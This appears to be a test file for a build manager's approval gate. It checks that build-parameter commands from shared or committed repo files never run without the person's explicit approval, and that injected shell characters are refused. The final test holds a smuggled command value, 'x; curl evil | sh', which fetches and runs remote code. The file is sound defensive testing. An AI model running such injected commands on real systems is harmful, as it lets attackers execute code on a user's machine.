/**
 * The gate on a parameter's `optionsCmd` (`builds.ts` `paramOptions`).
 *
 * The listing runs when the Build form OPENS, with no tap. A command out of the
 * SHARED builds file came with the checkout, so it must not run until the person
 * approved that exact command on this desktop; one from the gitignored LOCAL file
 * was written here and may. Running a build is NOT an approval.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";

const { BuildManager } = await import("../dist/builds.js");
const { repoSharedDir, repoStateDir } = await import("../dist/branddirs.js");

function setup(sharedCmd, localCmd, git = false) {
  const root = mkdtempSync(join(tmpdir(), "waterplane-approval-"));
  const repo = join(root, "repo");
  mkdirSync(repo, { recursive: true });
  if (git) execFileSync("git", ["init", "-q"], { cwd: repo });
  const entry = (cmd) => [{ id: "b", name: "B", cmd: "echo {{app}}", params: [{ id: "app", kind: "choice", optionsCmd: cmd }] }];
  if (sharedCmd) { mkdirSync(repoSharedDir(repo), { recursive: true }); writeFileSync(join(repoSharedDir(repo), "builds.json"), JSON.stringify(entry(sharedCmd))); }
  if (localCmd) { mkdirSync(repoStateDir(repo), { recursive: true }); writeFileSync(join(repoStateDir(repo), "builds.json"), JSON.stringify(entry(localCmd))); }
  const posted = [];
  const mgr = new BuildManager({ post: (i) => { posted.push(i); return { ok: false, reason: "stub" }; } }, root);
  return { root, repo, mgr, posted, entry };
}

test("a shared optionsCmd does not run until approved: it answers with the command text", async () => {
  const { repo, mgr } = setup("touch RAN && echo one");
  const r = await mgr.paramOptions(repo, "b");
  assert.deepEqual(r.app, { needsApproval: true, cmd: "touch RAN && echo one" });
  assert.equal(existsSync(join(repo, "RAN")), false, "the command must not have run");
});

test("approving that exact command runs it and is remembered; a changed command asks again", async () => {
  const { repo, mgr, root, entry } = setup("echo one; echo two");
  const first = await mgr.paramOptions(repo, "b", { paramId: "app", cmd: "echo one; echo two" });
  assert.deepEqual(first.app.options, ["one", "two"]);
  // remembered across a fresh manager (the host's own state, not the form's)
  const again = await new BuildManager({ post: () => ({ ok: false }) }, root).paramOptions(repo, "b");
  assert.deepEqual(again.app.options, ["one", "two"]);
  // the committed file changes under the person: a different command, a different hash
  writeFileSync(join(repoSharedDir(repo), "builds.json"), JSON.stringify(entry("touch RAN; echo evil")));
  const changed = await mgr.paramOptions(repo, "b");
  assert.equal(changed.app.needsApproval, true);
  assert.equal(existsSync(join(repo, "RAN")), false);
});

test("an approval is for one repo and one parameter, not every repo with the same text", async () => {
  const a = setup("echo one");
  await a.mgr.paramOptions(a.repo, "b", { paramId: "other", cmd: "echo one" });
  assert.equal((await a.mgr.paramOptions(a.repo, "b")).app.needsApproval, true, "approving another param id approves nothing");
  const b = setup("echo one");
  await a.mgr.paramOptions(a.repo, "b", { paramId: "app", cmd: "echo one" });
  assert.equal((await b.mgr.paramOptions(b.repo, "b")).app.needsApproval, true);
});

test("a LOCAL-file optionsCmd runs automatically only while git says the file is untracked", async () => {
  const { repo, mgr } = setup(null, "echo mine", true);
  assert.deepEqual((await mgr.paramOptions(repo, "b")).app.options, ["mine"]);
});

test("a TRACKED local file (a hostile repo committing it) is gated exactly like the shared one", async () => {
  const { repo, mgr } = setup(null, "touch RAN; echo evil", true);
  const rel = join(repoStateDir(repo), "builds.json");
  execFileSync("git", ["add", "-f", "--", rel], { cwd: repo });
  const r = await mgr.paramOptions(repo, "b");
  assert.deepEqual(r.app, { needsApproval: true, cmd: "touch RAN; echo evil" });
  assert.equal(existsSync(join(repo, "RAN")), false);
});

test("a committed symlink for the local dir does not pass as untracked: git is asked about the real path", async () => {
  const { repo, mgr, entry } = setup(null, null, true);
  mkdirSync(join(repo, "payload"), { recursive: true });
  writeFileSync(join(repo, "payload", "builds.json"), JSON.stringify(entry("touch RAN; echo evil")));
  symlinkSync(relative(dirname(repoStateDir(repo)), join(repo, "payload")), repoStateDir(repo));
  execFileSync("git", ["add", "-f", "--", "payload/builds.json"], { cwd: repo });
  const r = await mgr.paramOptions(repo, "b");
  assert.deepEqual(r.app, { needsApproval: true, cmd: "touch RAN; echo evil" });
  assert.equal(existsSync(join(repo, "RAN")), false);
});

test("not a git repo: a local file fails closed (asks), it does not run", async () => {
  const { repo, mgr } = setup(null, "touch RAN; echo mine", false);
  const r = await mgr.paramOptions(repo, "b");
  assert.equal(r.app.needsApproval, true);
  assert.equal(existsSync(join(repo, "RAN")), false);
});

test("an approval for text the person read does not approve a command rewritten since", async () => {
  const { repo, mgr, entry } = setup("echo one");
  writeFileSync(join(repoSharedDir(repo), "builds.json"), JSON.stringify(entry("touch RAN; echo evil")));
  const r = await mgr.paramOptions(repo, "b", { paramId: "app", cmd: "echo one" });
  assert.deepEqual(r.app, { needsApproval: true, cmd: "touch RAN; echo evil" });
  assert.equal(existsSync(join(repo, "RAN")), false);
  const none = await mgr.paramOptions(repo, "b", { paramId: "app" });
  assert.equal(none.app.needsApproval, true, "an approve without cmd approves nothing");
});

test("a local entry overriding a shared id is trusted; the shared command it shadows never runs", async () => {
  const { repo, mgr } = setup("touch RAN; echo evil", "echo mine", true);
  assert.deepEqual((await mgr.paramOptions(repo, "b")).app.options, ["mine"]);
  assert.equal(existsSync(join(repo, "RAN")), false);
});

test("running a build does not approve its optionsCmd", async () => {
  const { repo, mgr } = setup("echo one");
  mgr.run(repo, "b", { app: "x" });
  assert.equal((await mgr.paramOptions(repo, "b")).app.needsApproval, true);
});

test("run refuses a value carrying a shell metacharacter, naming the field", () => {
  const { repo, mgr, posted } = setup("echo one");
  const r = mgr.run(repo, "b", { app: "x; curl evil | sh" });
  assert.match(r.error, /“app”.*shell character/);
  assert.equal(posted.length, 0);
});
